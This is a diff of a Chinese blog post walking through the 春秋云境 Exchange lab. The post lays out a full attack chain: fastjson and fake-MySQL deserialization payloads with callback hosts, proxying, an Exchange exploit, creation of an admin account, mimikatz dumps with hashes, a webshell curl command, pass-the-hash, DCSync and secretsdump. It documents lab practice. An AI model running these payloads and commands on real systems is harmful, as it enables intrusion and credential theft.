@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://s2.loli.net/2023/08/05/VBSrawoetZQsGvT.png">
 <meta property="og:image" content="https://s2.loli.net/2023/08/05/sIR9jrTvdDlZiph.png">
 <meta property="article:published_time" content="2023-08-05T07:38:54.000Z">
-<meta property="article:modified_time" content="2023-08-05T11:14:10.982Z">
+<meta property="article:modified_time" content="2023-08-05T11:18:07.332Z">
 <meta property="article:author" content="sha&amp;blog">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -230,7 +230,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-08-05 15:38:54 / 修改时间：19:14:10" itemprop="dateCreated datePublished" datetime="2023-08-05T15:38:54+08:00">2023-08-05</time>
+              <time title="创建时间：2023-08-05 15:38:54 / 修改时间：19:18:07" itemprop="dateCreated datePublished" datetime="2023-08-05T15:38:54+08:00">2023-08-05</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -278,50 +278,37 @@
 <p>感谢免费提供环境的hxd🥰</p>
 <p>春秋云境的靶确实强</p>
 <span id="more"></span>
+<h2 id="flag01">flag01</h2>
 <p>开局扫IP，开了22,80,8000</p>
 <p>80是个php的站，没找到啥东西</p>
 <p>8000是Java的lumia erp，找了一些功能点发现都是json传的</p>
 <p>发现lumia erp有个awd出过，点是fastjson 1.2.68反序列化，找个地方验证一下，需要全字符URL编码</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;ebhd3z.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/v5cO6IDl2wQTKbV.png" alt="1.png"><figcaption aria-hidden="true">1.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/v5cO6IDl2wQTKbV.png"></p>
 <p>验证fastjson版本：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.InetSocketAddress&quot;</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ebhd3z.dnslog.cn&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/rqAz9LZ27mp1RFV.png" alt="2.png"><figcaption aria-hidden="true">2.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/rqAz9LZ27mp1RFV.png"></p>
 <p>服务器起一个<a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">fake mysql server</a>，需要<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>的jar文件</p>
 <p>config.json改一下jar地址以及加一条用cc6弹shell的命令</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/kpSjRAw56FPVvto.png" alt="13.png"><figcaption aria-hidden="true">13.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/kpSjRAw56FPVvto.png"></p>
 <p>起服务后服务端发包即可</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.1.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonsCollections6&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pas&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;detectCustomCollations&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/pzFvqJtaxbu8Nek.png" alt="3.png"><figcaption aria-hidden="true">3.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/pzFvqJtaxbu8Nek.png"></p>
 <p>flag01:</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/16CJPhYvQfigUFx.png" alt="4.png"><figcaption aria-hidden="true">4.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/16CJPhYvQfigUFx.png"></p>
+<h2 id="flag02">flag02</h2>
 <p>传一个fscan扫内网</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/UIaTrnogXLG5W6D.png" alt="5.png"><figcaption aria-hidden="true">5.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/UIaTrnogXLG5W6D.png"></p>
 <p>2和9都是windows的机器，入口是12，26是个个人pc，用frp代理socks5出来，Kali上配一下proxychains即可</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 8081</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
 <p>9有一个outlook，找到一个<a target="_blank" rel="noopener" href="https://github.com/herwonowr/exprolog">利用工具</a>可以任意命令执行</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/k9WV2bAE4XIlcYa.png" alt="6.png"><figcaption aria-hidden="true">6.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/k9WV2bAE4XIlcYa.png"></p>
 <p>添加一个账户操作</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user sha999 pass@123 /add</span><br><span class="line">net localgroup administrators benbi /add</span><br></pre></td></tr></table></figure>
 <p>密码需要字母数字特殊字符，不然的话会创建失败</p>
 <p>remmina登录，拿到flag02</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/t5oLuIHfc9kMAzg.png" alt="7.png"><figcaption aria-hidden="true">7.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/t5oLuIHfc9kMAzg.png"></p>
+<h2 id="flag04">flag04</h2>
 <p>mimikatz抓一下hash</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 100176 (00000000:00018750)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2023/8/5 13:31:52</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Zhangtong</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Zhangtong</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Zhangtong</span><br><span class="line">	 * Domain   : XIAORANG.LAB</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line">Authentication Id : 0 ; 10102536 (00000000:009a2708)</span><br><span class="line">Session           : Interactive from 4</span><br><span class="line">User Name         : DWM-4</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/8/5 13:53:06</span><br><span class="line">SID               : S-1-5-90-0-4</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : XIAORANG-EXC01$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : b2fdb13f284a5249f3657fb155b9ed01</span><br><span class="line">	 * SHA1     : b400c19ab343b632d23937cea02cf731088f9fd2</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : XIAORANG-EXC01$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : XIAORANG-EXC01$</span><br><span class="line">	 * Domain   : xiaorang.lab</span><br></pre></td></tr></table></figure>
@@ -329,40 +316,27 @@
 <p>然后用bloodhound分析一下域环境，刚加的用户没有域权限，需要用exchange的exp打的那个shell执行</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains <span class="built_in">curl</span> <span class="literal">--request</span> POST <span class="literal">--url</span> https://<span class="number">172.22</span>.<span class="number">3.9</span>/owa/auth/k7su8.aspx <span class="literal">--header</span> <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> <span class="literal">--data</span> <span class="string">&#x27;request=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;C:/Users/sha999/Desktop/SharpHound.exe -c all --OutputDirectory C:/Users/sha999/Desktop&quot;).stdout.readall())&#x27;</span> <span class="literal">-k</span></span><br></pre></td></tr></table></figure>
 <p>把生成的zip导到本地分析，参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288370.html">渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境 - FreeBuf网络安全行业门户</a></p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/rEiGmcyoktsFLU8.png" alt="14.png"><figcaption aria-hidden="true">14.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/rEiGmcyoktsFLU8.png"></p>
 <p>可以看到exchange机器是有writedacl权限的，可以利用WriteDacl权限添加Zhangtong的DCSync权限</p>
 <p>使用psexec连接system用户添加权限</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-psexec -hashes :b2fdb13f284a5249f3657fb155b9ed01 XIAORANG/XIAORANG-EXC01\<span class="variable">$@172</span>.22.3.9</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/lWr3ZxIyDpUuGEg.png" alt="15.png"><figcaption aria-hidden="true">15.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/lWr3ZxIyDpUuGEg.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -command &quot;cd C:/Users/sha999/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIde Zhangtong -Rights DCSync -Verbose&quot;</span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a></p>
 <p>secretsdump导一下域的hash</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-secretsdump xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/8aCutz7BSP6fTbG.png" alt="16.png"><figcaption aria-hidden="true">16.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/8aCutz7BSP6fTbG.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br></pre></td></tr></table></figure>
 <p>同样创建用户登录</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/nEJgDr5eKPiuyI8.png" alt="8.png"><figcaption aria-hidden="true">8.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/nEJgDr5eKPiuyI8.png"></p>
+<h2 id="flag03">flag03</h2>
 <p>域控改一下26pc的密码，登进去看看</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/otOiqx6Ekup4F8S.png" alt="9.png"><figcaption aria-hidden="true">9.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/otOiqx6Ekup4F8S.png"></p>
 <p>桌面上有个压缩包需要密码</p>
 <p>在exchange里面使用lumia的密码登录可以看到两个邮件，密码是csv里的某个电话</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/VBSrawoetZQsGvT.png" alt="10.png"><figcaption aria-hidden="true">10.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/VBSrawoetZQsGvT.png"></p>
 <p>拖出来直接爆破</p>
-<figure>
-<img src="https://s2.loli.net/2023/08/05/sIR9jrTvdDlZiph.png" alt="11.png"><figcaption aria-hidden="true">11.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/08/05/sIR9jrTvdDlZiph.png"></p>
 
     </div>
 
@@ -443,7 +417,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#exchange"><span class="nav-number">1.</span> <span class="nav-text">exchange</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#exchange"><span class="nav-number">1.</span> <span class="nav-text">exchange</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flag01"><span class="nav-number">1.1.</span> <span class="nav-text">flag01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag02"><span class="nav-number">1.2.</span> <span class="nav-text">flag02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag04"><span class="nav-number">1.3.</span> <span class="nav-text">flag04</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag03"><span class="nav-number">1.4.</span> <span class="nav-text">flag03</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
